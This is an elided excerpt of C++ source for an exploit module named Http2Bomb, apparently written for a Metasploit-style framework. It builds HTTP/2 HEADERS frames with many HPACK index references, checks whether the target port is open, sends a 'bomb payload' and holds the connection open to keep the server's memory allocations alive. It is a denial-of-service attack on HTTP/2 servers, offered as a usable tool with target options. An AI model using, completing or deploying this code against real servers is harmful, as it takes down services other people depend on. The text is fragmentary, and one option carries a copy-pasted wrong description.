    ...
    uint32_t IndexedReferences = 2048)
{
    ...
    return BuildFrame(HEADERS_FRAME_TYPE,
...
void RecvForever(SOCKET Sock, double EndTime)
{
    ...
    while (true)
    {
        double Remaining = EndTime - std::chrono::duration<double>(
...
bool PortOpen(const std::string& Host, uint16_t Port, int TimeoutSec = 3)
{
    ...
    for (addrinfo* Rp = Result; Rp && !Open; Rp = Rp->ai_next)
    {
        ...
        if (connect(Sock, Rp->ai_addr, (int)Rp->ai_addrlen) == 0) Open = true;
        closesocket(Sock);
    }
...
public:
    Http2Bomb()
    {
        ...
        RegisterOption("RPORT", std::make_unique<OptInt>(
            "", OptionRequired::Required,
            "The target port"));
        RegisterOption("Path", std::make_unique<OptString>(
            "/", OptionRequired::Required,
            "The target path"));
        RegisterOption("References", std::make_unique<OptInt>(
            "2048", OptionRequired::Required,
            "HPACK index references"));
        RegisterOption("NoTLS", std::make_unique<OptString>(
            "false", OptionRequired::Required,
            "HPACK index references"));
        RegisterOption("Streams", std::make_unique<OptInt>(
            "1", OptionRequired::Required,
            "Number of streams"));
        RegisterOption("HoldSec", std::make_unique<OptInt>(
            "30", OptionRequired::Required,
    ...
    bool Check() override
    {
        Color::PrintInfo() << "Checking " << GetOption("RHOST") + ":" + GetOption("RPORT") << "..." << std::endl;
        return PortOpen(GetOption("RHOST"),stoul(GetOption("RPORT")),3);
    }

    bool Run() override
    {
        Color::PrintInfo() << "Target Host: " << GetOption("RHOST") + ":" + GetOption("RPORT") + GetOption("Path") << std::endl;
        std::cout << std::endl;
        ...
        if (GetOption("NoTLS") == "false") Cfg.NoTls = false;
        if (GetOption("NoTLS") == "true") Cfg.NoTls = true;
        ...
        try {
            ...
            Color::PrintInfo() << "Bomb payload sent. Holding connection to keep server-side allocations alive.\n";
